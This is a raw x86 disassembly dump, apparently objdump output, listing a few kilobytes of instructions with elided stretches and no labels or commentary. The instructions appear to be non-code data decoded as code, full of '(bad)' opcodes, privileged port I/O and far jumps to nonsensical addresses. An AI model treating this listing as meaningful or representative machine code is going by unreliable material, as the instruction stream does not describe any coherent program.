  44cc2e:	les    ebp,FWORD PTR [ebp+0x54255233]
  44cc34:	xor    edx,DWORD PTR [ebp+0x1c331e25]
  44cc3a:	es push ebx
  44cc3c:	xor    dl,BYTE PTR [esi+eiz*1+0x7db3179]
  44cc43:	sub    al,0x31
  44cc45:	or     al,BYTE PTR [eax]
  44cc47:	adc    al,0x30
  44cc49:	or     BYTE PTR ds:[eax-0x77ffb9d8],bl
  44cc50:	sub    BYTE PTR [esi+0x0],cl
	...
  44cc6b:	call   0xc2748574
  44cc70:	xor    BYTE PTR [ecx-0x76cf3dd1],bh
  44cc76:	das    
  44cc77:	xchg   edx,eax
  44cc78:	xor    BYTE PTR [ecx+0x2f],bh
  44cc7b:	mov    ds:0x822f7930,al
  44cc80:	xor    BYTE PTR [ecx+0x2f],bh
  44cc83:	xchg   edi,eax
  44cc84:	xor    DWORD PTR [ebp+0x3d],esi
  44cc87:	je     0x44ccb2
  44cc89:	add    al,0x39
  44cc8b:	repnz sub BYTE PTR ds:0x9027723a,bh
  44cc92:	cmp    DWORD PTR [ebx-0xbc62fd9],esi
  44cc98:	add    al,0xe7
  44cc9a:	mov    ds:0x3ca66d2,eax
  44cc9f:	hlt    
  44cca0:	add    al,0x2f
  44cca2:	xor    eax,0x34a0346b
  44cca7:	(bad)  [ecx]
  44cca9:	push   ss
  44ccaa:	aaa    
  44ccab:	ss das 
  44ccad:	sub    eax,0x352f3e32
  44ccb2:	xor    al,BYTE PTR [esi+0x2f]
  44ccb5:	sub    eax,0x52f3e32
  44ccba:	xor    dl,BYTE PTR [esi]
  44ccbc:	das    
  44ccbd:	or     eax,0xf52f1e32
  44ccc2:	xor    DWORD PTR [esi],eax
  44ccc4:	das    
  44ccc5:	in     eax,dx
  44ccc6:	xor    esi,edi
  44ccc8:	cs xor DWORD PTR gs:[esi+0x2f],esi
  44cccd:	ins    DWORD PTR es:[edi],dx
  44ccce:	xor    DWORD PTR [eax],eax
	...
  44cce8:	jle    0x44cd19
  44ccea:	jne    0x44cd1d
  44ccec:	xchg   BYTE PTR [edi],ch
  44ccee:	ins    DWORD PTR es:[edi],dx
  44ccef:	xor    DWORD PTR [esi+0x2f],edi
  44ccf2:	test   DWORD PTR [ecx],esi
  44ccf4:	xchg   esi,eax
  44ccf5:	das    
  44ccf6:	lea    esi,[ecx]
  44ccf8:	sahf   
  44ccf9:	das    
  44ccfa:	jne    0x44cd2d
  44ccfc:	xchg   BYTE PTR [edi],ch
  44ccfe:	add    BYTE PTR [ebx+0x5],dh
  44cd01:	stos   DWORD PTR es:[edi],eax
  44cd02:	xor    DWORD PTR [ebx],ebp
  44cd04:	in     eax,0x42
  44cd06:	xor    DWORD PTR [ebx],esi
  44cd08:	in     eax,0x3a
  44cd0a:	xor    DWORD PTR [ebx],edi
  44cd0c:	in     eax,0x52
  44cd0e:	xor    DWORD PTR [ebx],esi
  44cd10:	in     eax,0x4a
  44cd12:	xor    DWORD PTR [ebx],ecx
  44cd14:	lds    esp,FWORD PTR [edx+0x31]
  44cd17:	adc    eax,ebp
  44cd19:	pop    edx
  44cd1a:	xor    ebx,edi
  44cd1c:	les    esi,FWORD PTR [edx+0x31]
  44cd1f:	repz les ebp,FWORD PTR [edx+0x31]
  44cd23:	jmp    0x44cd4b
  44cd25:	add    esi,DWORD PTR [ecx]
  44cd27:	repz and al,0xfb
  44cd2a:	xor    bl,bh
  44cd2c:	and    al,0x13
  44cd2e:	xor    ebx,esi
  44cd30:	and    al,0xb
  44cd32:	xor    DWORD PTR [ebx],ecx
  44cd34:	add    eax,0x5133123
  44cd39:	sbb    esi,DWORD PTR [ecx]
  44cd3b:	sti    
  44cd3c:	add    al,0x33
  44cd3e:	xor    ebx,esi
  44cd40:	add    al,0x2b
  44cd42:	xor    DWORD PTR [ebx],ebp
  44cd44:	in     eax,0xc2
  44cd46:	xor    BYTE PTR [ebx],dh
  44cd48:	in     eax,0xba
  44cd4a:	xor    BYTE PTR [ebx],bh
	...
  44cd64:	add    ch,ah
  44cd66:	shl    BYTE PTR [eax],cl
  44cd68:	xor    esp,ebp
  44cd6a:	retf   0xb30
  44cd6d:	(bad)
  44cd70:	adc    eax,ebp
  44cd72:	push   esi
  44cd73:	xor    cl,bh
  44cd75:	mov    edi,0xbff337f0
  44cd7a:	jmp    0x8937:0x76306237
  44cd81:	sub    BYTE PTR [edi+esi*1+0x36ec2061],ah
  44cd88:	aaa    
  44cd89:	pop    ds
  44cd8a:	sub    dh,BYTE PTR [esi]
  44cd8c:	rcl    DWORD PTR [ecx],0x76
  44cd8f:	xor    eax,0x2f271d00
  44cd94:	cmp    eax,DWORD PTR [ebp+0x633b5828]
  44cd9a:	sub    BYTE PTR [edx+0x3b],dh
  44cd9d:	shl    DWORD PTR [edi],cl
  44cd9f:	xchg   ebx,eax
  44cda0:	cmp    ebx,ecx
  44cda2:	daa    
  44cda3:	(bad)  
  44cda4:	cmp    ebp,DWORD PTR [ebp*1+0x2ca13c63]
  44cdab:	stos   DWORD PTR es:[edi],eax
  44cdac:	cmp    al,0xdf
  44cdae:	sub    al,0x0
  44cdb0:	add    BYTE PTR ds:0x61fff9b1,bl
  44cdb6:	add    DWORD PTR [eax],eax
  44cdb8:	add    BYTE PTR [eax],dl
  44cdba:	xor    DWORD PTR [ebx],ecx
  44cdbc:	xor    BYTE PTR [edx+0x19],cl
  44cdbf:	pop    edx
  44cdc0:	xor    DWORD PTR [ebp+0x18],eax
  44cdc3:	dec    esp
  44cdc4:	xor    ah,BYTE PTR [ecx+0x1a]
  44cdc7:	and    BYTE PTR [ebx],dh
	...
  44cde1:	add    BYTE PTR ds:0x6433a31a,ah
  44cde7:	sbb    esp,esp
  44cde9:	xor    esi,DWORD PTR [ebx-0x4cbfae7]
  44cdef:	adc    al,0x8a
  44cdf1:	xor    al,0x73
  44cdf3:	xor    al,0xb6
  44cdf5:	xor    al,0x65
  44cdf7:	xor    al,0x2
  44cdf9:	xor    eax,0x371416b1
  44cdfe:	pop    ds
  44cdff:	adc    eax,0x209937c7
  44ce04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44ce05:	cmp    BYTE PTR [eax+eiz*1+0xa],dl
  44ce09:	cmp    DWORD PTR [ebp+0x6939941f],edx
  44ce0f:	pop    ds
  44ce10:	nop
  44ce11:	cmp    dh,BYTE PTR [ecx+eiz*1+0x21743b90]
  44ce18:	push   edx
  44ce19:	cmp    al,0x7d
  44ce1b:	sbb    al,0x20
  44ce1d:	cmp    eax,0x3ee21b2c
  44ce22:	hlt    
  44ce23:	mov    ah,0x36
  44ce25:	add    ah,dh
  44ce27:	ins    DWORD PTR es:[edi],dx
  44ce28:	cmp    al,0xfe
  44ce2a:	dec    ebx
  44ce2b:	into   
  44ce2c:	cld    
  44ce2d:	push   esp
  44ce2f:	push   0x2c
  44ce31:	inc    eax
  44ce32:	add    al,0x4e
  44ce34:	sub    al,0xa0
  44ce36:	in     eax,0x8a
  44ce38:	sub    eax,0x2dc1e5aa
  44ce3d:	mov    esp,0xc82e2fe5
  44ce42:	in     eax,0x1d
  44ce44:	cs jmp 0x44ce47
	...
  44ce5f:	vcvtsd2si edi,xmm1
  44ce63:	lds    edx,FWORD PTR [ebp+0x32]
  44ce66:	shufps xmm4,XMMWORD PTR [ebp+0x32],0x1e
  44ce6b:	mov    BYTE PTR [ebp+0x32],0x2f
  44ce6f:	es xchg esi,eax
  44ce71:	xor    bh,BYTE PTR [ebx]
  44ce73:	es adc eax,0xe926502e
  44ce79:	sub    eax,0x2d85268e
  44ce7e:	daa    
  44ce7f:	pop    es
  44ce80:	jmp    FWORD PTR [esp+esi*2]
  44ce83:	pop    es
  44ce84:	nop
  44ce85:	sub    al,0xac
  44ce87:	pop    es
  44ce88:	mov    ah,0x2c
  44ce8a:	(bad)  
  44ce8b:	pop    es
  44ce8c:	je     0x44ceb6
  44ce8e:	or     eax,0x42285ae8
  44ce93:	loopne 0x44ceae
  44ce95:	xor    BYTE PTR [ecx-0x18],dl
  44ce98:	cmc    
  44ce99:	das    
  44ce9a:	xchg   edx,eax
  44ce9b:	loopne 0x44ce6b
  44ce9d:	das    
  44ce9e:	ror    al,1
  44cea0:	mov    cl,0x2f
  44cea2:	add    al,0xc1
  44cea4:	cmp    eax,0x34c9152f
  44cea9:	das    
  44ceaa:	test   cl,al
  44ceac:	out    0x2e,al
  44ceae:	fwait
  44ceaf:	sub    DWORD PTR [esi],ebx
  44ceb1:	das    
  44ceb2:	mov    bh,0x21
  44ceb4:	add    eax,0x19653158
  44ceb9:	in     eax,0x2d
  44cebb:	jmp    0x44ced7
  44cebd:	stc    
  44cebe:	sub    eax,0x2e171b18
	...
  44cedb:	add    BYTE PTR [ecx-0x5ed25be6],dh
  44cee1:	sbb    dl,al
  44cee3:	sub    eax,0x2db31ac7
  44cee8:	jg     0x44cf04
  44ceea:	push   eax
  44ceeb:	cs sbb bh,BYTE PTR fs:[ebx]
  44ceef:	cs cmp eax,0xe2e021a
  44cef5:	sbb    bl,BYTE PTR [ebx]
  44cef7:	cs cli 
  44cef9:	sbb    ebx,DWORD PTR [eax+0x681b832e]
  44ceff:	das    
  44cf00:	jne    0x44cf1d
  44cf02:	pop    eax
  44cf03:	das    
  44cf04:	pop    esp
  44cf05:	sbb    ecx,DWORD PTR [ebx+0x2f]
  44cf08:	ret    0x691a
  44cf0b:	cmp    edi,ecx
  44cf0d:	sbb    eax,0x1e723b19
  44cf12:	cmp    DWORD PTR [edx],0xffffff89
  44cf15:	and    DWORD PTR [eax-0x3ede3dc9],edx
  44cf1b:	aaa    
  44cf1c:	icebp  
  44cf1d:	pop    ds
  44cf1e:	add    eax,0x6a201039
  44cf23:	cmp    BYTE PTR [esi+0x20],ah
  44cf26:	ja     0x44cf60
  44cf28:	lods   al,BYTE PTR ds:[esi]
  44cf29:	and    dh,ah
  44cf2b:	xor    eax,0x36ec2332
  44cf30:	dec    ebp
  44cf31:	and    dl,BYTE PTR [esi+esi*1-0x48]
  44cf35:	and    bl,BYTE PTR [ebx-0x18fb0bca]
  44cf3b:	push   ebx
  44cf3c:	mov    ah,BYTE PTR [edx+0x5a]
  44cf3f:	add    eax,DWORD PTR [eax]
	...
  44cf59:	hlt    
  44cf5a:	add    al,0x60
  44cf5c:	xor    eax,DWORD PTR [ebx+0x14]
  44cf5f:	add    bh,bl
  44cf61:	and    eax,0x25582dcd
  44cf66:	jge    0x44cf95
  44cf68:	sub    DWORD PTR ds:0x254a2d36,esp
  44cf6e:	outs   dx,BYTE PTR ds:[esi]
  44cf6f:	sub    eax,0x2d05055e
  44cf74:	fadd   QWORD PTR [esi]
  44cf76:	sti    
  44cf77:	sub    al,0xb2
  44cf79:	push   es
  44cf7a:	shr    DWORD PTR [ebx+edi*4],cl
  44cf7d:	push   es
  44cf7e:	mov    WORD PTR [esp+ecx*4],gs
  44cf81:	out    0x94,al
  44cf83:	sub    al,0x3a
  44cf85:	out    0xf9,al
  44cf87:	xor    esi,DWORD PTR [ebx+0x7d33d4d3]
  44cf8d:	retf   
  44cf8e:	cmp    BYTE PTR [ebx],dh
  44cf90:	sti    
  44cf91:	les    esp,FWORD PTR [ecx]
  44cf93:	xor    edx,DWORD PTR [eax+0x323293c4]
  44cf99:	les    eax,FWORD PTR [eax+0x32]
  44cf9c:	or     al,ah
  44cf9e:	pop    ecx
  44cf9f:	xor    dh,BYTE PTR [ecx+eiz*1+0x1932318b]
  44cfa6:	push   ebx
  44cfa7:	xor    eax,eax
  44cfa9:	adc    ch,BYTE PTR [ecx+esi*1-0xe]
  44cfad:	or     cl,bh
  44cfaf:	xor    BYTE PTR ds:0x4230c921,al
  44cfb5:	sbb    DWORD PTR [esi+0x30],eax
  44cfb8:	into   
  44cfb9:	adc    DWORD PTR [esi],esp
  44cfbb:	cmp    bh,dh
	...
  44cfd5:	add    bh,bh
  44cfd7:	dec    eax
  44cfd8:	xor    eax,0x34cceeb5
  44cfdd:	cs in  eax,dx
  44cfdf:	pop    ecx
  44cfe0:	xor    al,0xe5
  44cfe2:	jmp    0x44cf83
  44cfe4:	cmp    eax,DWORD PTR [esp+ebx*8-0x34c3c4db]
  44cfeb:	loop   0x44d027
  44cfed:	dec    esi
  44cfee:	ret    
  44cfef:	ins    DWORD PTR es:[edi],dx
  44cff0:	cmp    al,BYTE PTR [eax]
  44cff2:	cmc    
  44cff3:	sbb    cl,BYTE PTR [eax+0x361a4a3e]
  44cff9:	aas    
  44cffa:	ficom  WORD PTR [edi]
  44cffc:	test   al,0x3f
  44cffe:	mov    DWORD PTR [edi],edx
  44d000:	fistp  QWORD PTR [edi]
  44d002:	dec    ebp
  44d003:	in     eax,0xf9
  44d005:	push   DWORD PTR [ebp+0x8]
  44d008:	add    BYTE PTR [eax],al
  44d00a:	call   FWORD PTR [eax]
  44d00c:	aaa    
  44d00d:	xor    BYTE PTR [eax+0x15],ch
  44d010:	xor    BYTE PTR [eax],0x77
  44d013:	sbb    BYTE PTR [ecx+esi*1],al
  44d016:	stos   BYTE PTR es:[edi],al
  44d017:	adc    eax,0x143632c0
  44d01c:	mov    dh,BYTE PTR [ebx]
  44d01e:	fist   DWORD PTR [ebx]
  44d020:	and    al,0x34
  44d022:	push   edi
  44d023:	xor    DWORD PTR [ebx+0x3714ca34],edx
  44d029:	xor    eax,0x35853281
  44d02e:	cdq    
  44d02f:	xor    DWORD PTR [eax],eax
  44d031:	ss pop edx
  44d033:	das    
  44d034:	pop    ebp
  44d035:	ss int 0x32
  44d038:	div    BYTE PTR [esi]
	...
  44d052:	add    BYTE PTR [ebx+0x32],cl
  44d055:	jae    0x44d08f
  44d057:	inc    edx
  44d058:	and    DWORD PTR [eax+edi*1+0x391e1be7],ebp
  44d05f:	jmp    0x44d07c
  44d061:	cmp    BYTE PTR [ecx],bh
  44d063:	push   ss
  44d064:	sbb    al,0x54
  44d066:	cmp    DWORD PTR ds:0x4439671c,esi
  44d06c:	sbb    esp,DWORD PTR [eax-0x25e47bc7]
  44d072:	cmp    DWORD PTR [ecx],eax
  44d074:	sbb    eax,DWORD PTR [edx+0x3a]
  44d077:	add    DWORD PTR [ebx],ebx
  44d079:	push   edx
  44d07a:	cmp    dh,cl
  44d07c:	sbb    al,ch
  44d07e:	cmp    bh,BYTE PTR [eax+0x1e]
  44d081:	add    DWORD PTR [ebx],edi
  44d083:	hlt    
  44d084:	dec    ebx
  44d085:	aaa    
  44d086:	ss iret 
  44d088:	or     DWORD PTR [edi],esi
  44d08a:	ins    DWORD PTR es:[edi],dx
  44d08b:	mov    edi,0xbf813704
  44d090:	enter  0xe530,0x30
  44d094:	fbstp  TBYTE PTR [eax]
  44d096:	sub    BYTE PTR [ecx],ch
  44d098:	xchg   edi,eax
  44d099:	xor    DWORD PTR [esi],edi
  44d09b:	and    DWORD PTR [ebx],ebp
  44d09d:	xor    ch,BYTE PTR [eax]
  44d09f:	sbb    dl,BYTE PTR [edi-0x4eece0ce]
  44d0a5:	xor    ebp,DWORD PTR [ebp+0xb]
  44d0a8:	repnz xor esp,DWORD PTR [ebx-0x28cbe9fd]
  44d0af:	sti    
  44d0b0:	(bad)  
  44d0b1:	xor    edi,eax
  44d0b3:	rep ins DWORD PTR es:[edi],dx
  44d0b5:	ins    BYTE PTR es:[edi],dx
  44d0b6:	inc    BYTE PTR [eax]
	...
  44d0d0:	sub    edx,edx
  44d0d2:	cld    
  44d0d3:	push   esp
  44d0d5:	lock sub al,0x8b
  44d0d8:	in     al,0xda
  44d0da:	sub    al,0x97
  44d0dc:	(bad)  
  44d0dd:	int3   
  44d0de:	sub    al,0xa7
  44d0e0:	les    edi,FWORD PTR [esp+ebp*1+0x2d2ac4b7]
  44d0e7:	retf   
  44d0e8:	les    eax,FWORD PTR [ecx]
  44d0ea:	sub    eax,0x2d5f24e3
  44d0ef:	add    BYTE PTR ds:0x25152d3c,ah
  44d0f5:	stc    
  44d0f6:	xor    dh,BYTE PTR [eiz*1+0x53e3324]
  44d0fd:	and    al,0x33
  44d0ff:	dec    esi
  44d100:	add    eax,0x6cc3331
  44d105:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44d106:	aaa    
  44d107:	in     al,dx
  44d108:	add    BYTE PTR [eax],bl
  44d10a:	aaa    
  44d10b:	(bad)  
  44d10c:	jmp    0xe1f3079e
  44d111:	aam    0x36
  44d113:	ret    0x4e9
  44d116:	mov    edi,0x9d199339
  44d11b:	cmp    DWORD PTR [ebx+0x2639fa19],edx
  44d121:	pop    ss
  44d122:	sub    edi,DWORD PTR [edx]
  44d124:	ins    DWORD PTR es:[edi],dx
  44d125:	push   ss
  44d126:	pop    esp
  44d127:	cmp    dl,BYTE PTR [esi+edx*1+0x17a23b66]
  44d12e:	sbb    eax,0x9b1dd02c
  44d133:	sub    eax,0x0
	...
  44d14c:	add    BYTE PTR [eax+0x1d],bl
  44d14f:	jmp    0x44d17e
  44d151:	pop    ebp
  44d152:	sbb    bh,BYTE PTR [eax+0x31b5a2e]
  44d158:	xor    BYTE PTR [ebx],bl
  44d15a:	and    DWORD PTR [eax-0x1bde19d1],edi
  44d160:	xor    BYTE PTR [eax],cl
  44d162:	and    bl,BYTE PTR [ebx+0x44218130]
  44d168:	xor    dh,BYTE PTR [ebp-0x39cd63e1]
  44d16e:	pop    ds
  44d16f:	ret    
  44d170:	xor    dl,BYTE PTR [ebx+0x7632921f]
  44d176:	pop    ds
  44d177:	inc    edi
  44d178:	xor    edx,DWORD PTR [ecx+0x1f]
  44d17b:	dec    edi
  44d17c:	xor    edi,DWORD PTR [ebx]
  44d17e:	pop    ds
  44d17f:	add    eax,0xe71f0a33
  44d184:	add    esi,edx
  44d186:	pop    esi
  44d187:	sbb    al,BYTE PTR [esp+esi*8]
  44d18a:	add    al,0xcc
  44d18c:	xor    edi,DWORD PTR [ecx]
  44d18e:	adc    eax,0x15433438
  44d193:	inc    edi
  44d194:	xor    al,0x4c
  44d196:	adc    eax,0x156a3360
  44d19b:	xchg   ebp,eax
  44d19c:	xor    eax,DWORD PTR [eax-0x19cc61eb]
  44d1a2:	adc    ebx,esp
  44d1a4:	xor    al,0xeb
  44d1a6:	adc    eax,DWORD PTR [eax]
  44d1a8:	pop    edx
  44d1a9:	loopne 0x44d229
  44d1ab:	cs mov eax,gs
  44d1ae:	gs adc al,BYTE PTR cs:[eax]
	...
  44d1ca:	loop   0x44d1a6
  44d1cc:	sub    eax,0x33c2cbc5
  44d1d1:	and    eax,0x7133edcc
  44d1d6:	retf   
  44d1d7:	jp     0x44d20c
  44d1d9:	push   edx
  44d1da:	ret    
  44d1db:	pushf  
  44d1dc:	xor    edi,DWORD PTR [edi]
  44d1de:	sub    ebp,DWORD PTR [ebx]
  44d1e0:	xor    edx,DWORD PTR [ebp*1+0x1def31c0]
  44d1e7:	jb     0x44d21a
  44d1e9:	test   DWORD PTR ds:0xd5a3139,ebx
  44d1ef:	repnz xor BYTE PTR [edx+0x71308f0e],ah
  44d1f6:	(bad)  
  44d1f7:	xchg   edx,eax
  44d1f8:	xor    BYTE PTR [edi+0x4b3041fe],al
  44d1fe:	out    dx,al
  44d1ff:	xor    BYTE PTR gs:[ebx],bh
  44d202:	out    dx,al
  44d203:	add    al,0x38
  44d205:	out    0xcf,al
  44d207:	or     edi,DWORD PTR [eax]
  44d209:	iret   
  44d20a:	iret   
  44d20b:	pop    ss
  44d20c:	cmp    BYTE PTR [ecx-0x4bc84321],bh
  44d212:	fucomip st,st(5)
  44d214:	aaa    
  44d215:	xchg   ecx,eax
  44d216:	iret   
  44d217:	fidiv  DWORD PTR [edi]
  44d219:	outs   dx,BYTE PTR ds:[esi]
  44d21a:	iret   
  44d21b:	mov    DWORD PTR [edi],esi
  44d21d:	aas    
  44d21e:	pop    ds
  44d21f:	dec    ecx
  44d220:	aaa    
  44d221:	daa    
  44d222:	pop    ds
  44d223:	cmp    eax,0x6e0f0237
  44d228:	aaa    
  44d229:	loope  0x44d233
  44d22b:	add    eax,0xf137
	...
  44d244:	add    BYTE PTR [eax],al
  44d246:	add    BYTE PTR [esi],bl
  44d248:	or     al,0x37
  44d24a:	icebp  
  44d24b:	push   ds
  44d24c:	daa    
  44d24d:	aaa    
  44d24e:	dec    DWORD PTR [esi]
  44d250:	sbb    DWORD PTR [edi],esi
  44d252:	add    al,dh
  44d254:	sub    ebx,eax
  44d256:	cmp    DWORD PTR [edi-0x40c62cd7],ecx
  44d25c:	sub    DWORD PTR [esi],ecx
  44d25e:	cmp    dh,BYTE PTR [eax-0x3fc5e1d1]
  44d264:	das    
  44d265:	stos   DWORD PTR es:[edi],eax
  44d266:	cmp    ch,BYTE PTR [ecx]
  44d268:	xor    dl,cl
  44d26a:	cmp    ebx,DWORD PTR [edi]
  44d26c:	cmp    DWORD PTR cs:0x3e1d2d63,0x3e6512ee
  44d277:	in     eax,0x12
  44d279:	mov    cl,0x3e
  44d27b:	pushf  
  44d27c:	adc    al,cl
  44d27e:	ds jl  0x44d293
  44d281:	sar    DWORD PTR [esi],1
  44d283:	lods   al,BYTE PTR ds:[esi]
  44d284:	adc    ah,cl
  44d286:	ds push ebp
  44d288:	adc    al,0x76
  44d28a:	aas    
  44d28b:	pop    ebp
  44d28c:	icebp  
  44d28d:	stc    
  44d28e:	jmp    DWORD PTR [ebp+0x8]
  44d291:	add    BYTE PTR [eax],al
  44d293:	jnp    0x44d2a6
  44d295:	jl     0x44d2c7
  44d297:	int3   
  44d298:	sbb    BYTE PTR [edi],ch
  44d29a:	xor    DWORD PTR [ebp-0x35ce81ef],ebx
  44d2a0:	adc    DWORD PTR [edi-0x46ee69cf],ebx
  44d2a6:	xor    eax,esp
  44d2a8:	adc    DWORD PTR [edx+esi*1],ecx
	...
  44d2c3:	add    BYTE PTR [esi+0x17],bh
  44d2c6:	bound  esi,QWORD PTR [edx]
  44d2c8:	mov    dl,0x16
  44d2ca:	xor    BYTE PTR [ebx],0xa3
  44d2cd:	pop    ss
  44d2ce:	mov    ah,0x33
  44d2d0:	aaa    
  44d2d1:	adc    al,0xde
  44d2d3:	xor    eax,0x360d13e6
  44d2d8:	popf   
  44d2d9:	push   ds
  44d2da:	ds ss sbb al,0x1f
  44d2de:	sub    ebx,DWORD PTR ss:[bx]
  44d2e2:	mov    BYTE PTR [esi],dh
  44d2e4:	hlt    
  44d2e5:	xor    DWORD PTR [esi],0x36a70abf
  44d2eb:	(bad)  
  44d2ec:	add    bl,BYTE PTR [ebx+0x38eb0236]
  44d2f2:	aaa    
  44d2f3:	push   eax
  44d2f4:	jecxz  0x44d2c0
  44d2f6:	ss mov gs,ebx
  44d2f9:	xor    BYTE PTR [edi],0xa5
  44d2fc:	jecxz  0x44d2b7
  44d2fe:	aaa    
  44d2ff:	mov    ch,0xcb
  44d301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44d302:	aaa    
  44d303:	daa    
  44d304:	int3   
  44d305:	es sub al,0x74
  44d308:	mov    esp,0xbcc124e7
  44d30d:	jge    0x44d333
  44d30f:	(bad)  [esi+esi*2]
  44d312:	and    al,0xf0
  44d314:	sub    al,0x9f
  44d316:	and    eax,0x25691d70
  44d31b:	call   0xbd0d:0xe225801d
  44d322:	and    eax,0x2a0a0e11
  44d327:	push   0x0
	...
  44d341:	(bad)  
  44d342:	mov    edx,0xccfe9f2a
  44d347:	sub    al,BYTE PTR [edi]
  44d349:	out    dx,eax
  44d34a:	push   0x2b
  44d34c:	and    ch,bh
  44d34e:	xchg   ebx,eax
  44d34f:	sub    ebp,DWORD PTR [esi-0x32d42b21]
  44d355:	ffreep st(6)
  44d357:	sub    esi,ebp
  44d359:	iret   
  44d35a:	pop    es
  44d35b:	xor    BYTE PTR [ecx],ah
  44d35d:	enter  0x28c6,0xb6
  44d361:	rcr    BYTE PTR ds:0xb8d729,0x29
  44d368:	push   0x31
  44d36a:	iret   
  44d36b:	sub    DWORD PTR [eax],edx
  44d36d:	sub    dl,BYTE PTR [edi+0x3f22622e]
  44d373:	das    
  44d374:	mov    ds:0x23e7051b,eax
  44d379:	rcr    BYTE PTR [ebx-0x3a],cl
  44d37c:	add    al,0xf4
  44d37e:	add    al,0x68
  44d380:	xor    eax,0x359f1561
  44d385:	rcl    DWORD PTR ds:0x182c31fe,1
  44d38b:	xor    eax,DWORD PTR fs:[ebp+0x65337817]
  44d392:	pop    ss
  44d393:	cwde   
  44d394:	xor    edi,DWORD PTR [ebp-0x71cc60e9]
  44d39a:	pop    ss
  44d39b:	jmp    0xc937:0xdc10e937
  44d3a2:	adc    BYTE PTR [ecx],ch
  44d3a4:	cmp    BYTE PTR [eax],al
	...
  44d3be:	or     eax,0x7d380011
  44d3c3:	adc    BYTE PTR [eax+edi*1-0x6b],dl
  44d3c7:	adc    BYTE PTR [eax+edi*1-0x5f],al
  44d3cb:	adc    BYTE PTR [ecx+0x4c103d38],dl
  44d3d1:	cmp    BYTE PTR [eax+edx*1+0x59],cl
  44d3d5:	cmp    ch,ah
  44d3d7:	adc    DWORD PTR [ecx],ecx
  44d3d9:	cmp    DWORD PTR [ecx],ecx
  44d3db:	adc    dh,BYTE PTR [esi-0x4aee2fc8]
  44d3e1:	cmp    BYTE PTR [ebp+0x13397a11],al
  44d3e7:	adc    ebx,ebx
  44d3e9:	xor    eax,0x36c512b2
  44d3ee:	mov    edx,DWORD PTR [ebx]
  44d3f0:	call   0x7f37:0x61138f36
  44d3f7:	adc    esi,DWORD PTR [esi+0x37]
  44d3fa:	push   edi
  44d3fb:	adc    eax,DWORD PTR [eax+0x37]
  44d3fe:	dec    ebp
  44d3ff:	adc    edi,DWORD PTR [edx]
  44d401:	aaa    
  44d402:	out    dx,eax
  44d403:	adc    ah,dh
  44d405:	sub    edi,eax
  44d407:	sbb    al,0x0
  44d409:	fimul  DWORD PTR [edi]
  44d40b:	repnz aaa 
  44d40d:	ret    0x2c0f
  44d410:	cmp    BYTE PTR [eax+eiz*1],bl
  44d413:	push   ds
  44d414:	cmp    BYTE PTR [edx+0x18],cl
  44d417:	aam    0x37
  44d419:	stos   DWORD PTR es:[edi],eax
  44d41a:	divps  xmm6,XMMWORD PTR [edi]
  44d41d:	in     eax,dx
  44d41e:	or     BYTE PTR [edi],ch
  44d420:	aaa    
  44d421:	sub    BYTE PTR [eax],al
	...
  44d43b:	loope  0x44d3ee
  44d43d:	ss dec ebx
  44d43f:	fnop   
  44d441:	ss shl BYTE PTR fs:[edx+0x26c8c136],1
  44d449:	ss push eax
  44d44b:	fstp   QWORD PTR [eax+0x6addbe35]
  44d451:	xor    eax,0x34afcee2
  44d456:	add    al,0xcf
  44d458:	fnstenv [eax+eax*2]
  44d45b:	push   ds
  44d45c:	cmc    
  44d45d:	cmp    eax,esp
  44d45f:	sbb    ebp,DWORD PTR [eax]
  44d461:	cmp    al,0x28
  44d463:	and    al,0xab
  44d465:	cmp    ebx,esp
  44d467:	and    al,0xfc
  44d469:	cmp    al,bh
  44d46b:	add    al,0xe6
  44d46d:	cmp    cl,ah
  44d46f:	add    al,0xdf
  44d471:	cmp    dh,BYTE PTR [ebx+0x4]
  44d474:	inc    edx
  44d475:	cmp    dh,bh
  44d477:	or     eax,ecx
  44d479:	cmp    ebx,edx
  44d47b:	loope  0x44d4f4
  44d47d:	cmp    DWORD PTR [ebp-0x27],eax
  44d480:	add    eax,0xe0d30c39
  44d485:	cmp    BYTE PTR ds:0xe90004ca,ah
  44d48b:	(bad)  
  44d48c:	pop    edx
  44d48d:	clc    
  44d48e:	cmp    edi,esi
  44d490:	add    al,0x0
  44d492:	in     al,dx
  44d493:	(bad)  
  44d494:	and    dh,BYTE PTR [eax]
  44d496:	into   
  44d497:	(bad)  
  44d498:	int3   
  44d499:	das    
  44d49a:	add    BYTE PTR [edx+0x304d15],ch
	...
  44d4b8:	jb     0x44d4cf
  44d4ba:	arpl   WORD PTR [eax],si
  44d4bc:	pop    esp
  44d4bd:	push   ss
  44d4be:	js     0x44d4f0
  44d4c0:	push   edx
  44d4c1:	push   ss
  44d4c2:	lods   al,BYTE PTR ds:[esi]
  44d4c3:	xor    BYTE PTR [esi-0x4bcf35f0],al
  44d4c9:	adc    bh,dl
  44d4cb:	xor    BYTE PTR [ebp-0x58cf0bf0],bl
  44d4d1:	adc    dl,bh
  44d4d3:	xor    cl,dl
  44d4d5:	push   ss
  44d4d6:	push   ds
  44d4d7:	xor    ebx,ebx
  44d4d9:	adc    eax,0x15ac3194
  44d4de:	add    DWORD PTR [edx],esi
  44d4e0:	(bad)  
  44d4e1:	adc    ebx,DWORD PTR [ebx]
  44d4e3:	xor    ah,BYTE PTR [edi-0x20cdcfed]
  44d4e9:	push   ss
  44d4ea:	ds xor bl,cl
  44d4ed:	push   ss
  44d4ee:	push   esp
  44d4ef:	xor    ah,dl
  44d4f1:	push   ss
  44d4f2:	xor    BYTE PTR [edx],0xe4
  44d4f5:	push   ss
  44d4f6:	stos   BYTE PTR es:[edi],al
  44d4f7:	xor    bh,BYTE PTR [ebx]
  44d4f9:	adc    al,0x9d
  44d4fb:	xor    edx,DWORD PTR [ebp-0x5ccc1aed]
  44d501:	adc    DWORD PTR [esp+esi*1+0x59],ebp
  44d505:	adc    DWORD PTR [ecx+0x34],edi
  44d508:	jbe    0x44d526
  44d50a:	in     eax,0x34
  44d50c:	not    BYTE PTR [ecx]
  44d50e:	push   esp
  44d50f:	xor    eax,0x3577128a
  44d514:	jbe    0x44d527
  44d516:	in     al,0x35
  44d518:	ss jno 0x44d555
	...
  44d533:	add    BYTE PTR [eax],al
  44d535:	(bad)  
  44d536:	adc    ah,BYTE PTR [esi+esi*1+0x377a12a2]
  44d53d:	scas   al,BYTE PTR es:[edi]
  44d53e:	paddsb mm7,QWORD PTR [ecx]
  44d541:	push   es
